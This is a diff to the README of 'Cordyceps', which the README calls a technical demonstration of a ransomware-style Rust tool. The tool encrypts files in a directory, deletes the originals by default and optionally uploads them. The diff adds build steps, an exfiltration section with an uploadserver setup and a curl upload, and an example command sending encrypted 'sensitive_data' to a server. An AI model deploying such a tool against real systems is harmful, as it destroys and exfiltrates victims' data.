@@ -44,13 +44,11 @@ This project is a **technical demonstration**, not a weapon. Do not use Cordycep
 
 
 ## Installation
-```
-# TODO: Provide installation instructions (e.g., cargo install, build from source)
-# Example:
-# git clone https://github.com/your-username/cordyceps.git
-# cd cordyceps
-# cargo build --release
-# cp target/release/cordyceps /usr/local/bin/
+```sh
+git clone https://github.com/lopes/cordyceps.git
+cd cordyceps
+cargo build --release
+cp target/release/cordyceps $HOME/.local/bin/
 ```
 
 
@@ -71,8 +69,7 @@ Use the `encrypt` command to begin the encryption and exfiltration process.
 - `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
 - `-k, --key <PATH>`: File path to the main public key. Default: `main-public.key`.
 - `-n, --no-delete`: Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, the original file is deleted.
-- `-s, --server <ADDRESS>`: The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). Default: `http://localhost:8080`.
-- `-t, --target-folder <FOLDER_NAME>`: Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`). Default: empty, files are uploaded to the root of the specified server endpoint.
+- `-s, --server <ADDRESS>`: The **optional** URL of the server to exfiltrate data (e.g., `http://server:2673`). Default: none, exfiltration is disabled.
 
 #### `decrypt` Command
 Use the `decrypt` command to restore `.zombie` files using the provided private key.
@@ -81,12 +78,31 @@ Use the `decrypt` command to restore `.zombie` files using the provided private 
 - `-k, --key <PATH>`: File path to the main private key. Default: `main-private.key`.
 - `-n, --no-delete`: Prevents the `.zombie` file from being deleted after successful decryption. Default: `false`, the `.zombie` file is deleted.
 
+### Exfiltration
+Exfiltration is an optional step for the encryption routine. The simplest form to implement it is to use Python's [uploadserver](https://pypi.org/project/uploadserver/). The easiest way of deploying it on the localhost is shown below:
+
+```sh
+python3 -m pip install --user uploadserver
+python3 -m uploadserver 2673 --bind 127.0.0.1 --directory /tmp/cordyceps
+```
+
+After installing the uploadserver module on the localhost, run it binding it to port 2673 and to any directory. Then, you can test it with cURL to upload `./foobar.fb` file:
+
+```sh
+curl -X POST -F "files=@./foobar.fb" http://localhost:2673/upload
+```
+
+> [!NOTE]
+> Since Cordyceps only exfiltrates encrypted files, using HTTP without TLS is perfectly fine.
+
+If it worked, the exfiltration routine under [Cordyceps::net](src/net.rs) should work.🤞
+
 ### Examples
 #### Encryption Example
 This command will encrypt files in the `/path/to/sensitive_data` directory, send them to the specified server and folder, but will not delete the original files.
 
 ```sh
-cordyceps encrypt -p /path/to/sensitive_data -k /path/to/main-private.key -s https://your.exfil.server:8443 -t my_laptop_data -n
+cordyceps encrypt -p /path/to/sensitive_data -k /path/to/main-public.key -s http://server:2673 -n
 ```
 
 #### Decryption Example
@@ -101,7 +117,7 @@ cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/main-private.key
 - **Main Public Key**: For **encryption** operations, the main Curve25519 public key must be provided via the `--key` CLI option. This key is used to establish the shared secret for encrypting the AES key.
 - **Main Private Key**: For **decryption** operations, the corresponding Curve25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**
 
-Cordyceps is shipped with the `generate` command that creates a new keypair for this purpose.
+Cordyceps is shipped with the `generate` command that creates a new keypair.
 
 
 ## Contributing
